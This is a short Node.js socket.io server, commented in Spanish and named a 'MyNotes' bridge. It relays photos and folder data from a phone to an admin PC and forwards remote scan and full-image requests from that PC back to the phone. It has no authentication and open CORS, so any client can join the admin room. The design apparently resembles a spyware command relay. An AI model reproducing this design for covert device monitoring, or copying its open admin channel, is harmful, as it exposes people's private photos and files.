const express = require('express');
const app = express();
const http = require('http');
const server = http.createServer(app);
const { Server } = require("socket.io");
const io = new Server(server, {
    cors: { origin: "*" },
    maxHttpBufferSize: 1e8 // 100 MB (Permite pasar fotos HD grandes)
});

// Ruta básica para saber que está vivo
app.get('/', (req, res) => {
  res.send('<h1>Servidor Puente MyNotes Activo 🌉</h1>');
});

io.on('connection', (socket) => {
    console.log('Un usuario se conectó:', socket.id);

    // 1. El PC se identifica como Administrador
    socket.on('join_admin', () => {
        socket.join('admin_room');
        console.log("🖥️ PC Admin conectado y unido a la sala");
    });

    // 2. Recepción de datos desde el CELULAR (Fotos, Carpetas, etc)
    socket.on('usrData', (data) => {
        // NO GUARDAMOS NADA. Reenviamos directo al PC.
        io.to('admin_room').emit('data_from_phone', data);
        // console.log(`📦 Dato tipo ${data.dataType} reenviado al PC`);
    });

    // 3. Comandos desde el PC hacia el CELULAR
    socket.on('command_start_scan', (args) => {
        socket.broadcast.emit('command_start_scan', args);
        console.log("📡 Orden de escaneo enviada");
    });

    socket.on('command_stop_scan', () => {
        socket.broadcast.emit('command_stop_scan');
    });

    socket.on('request_full_image', (data) => {
        // El PC pide una foto HD específica
        socket.broadcast.emit('request_full_image', data);
        console.log("uD83D\uDD0D Solicitando HD:", data.path);
    });

    socket.on('disconnect', () => {
        console.log('Usuario desconectado');
    });
});

server.listen(3000, () => {
  console.log('listening on *:3000');
});
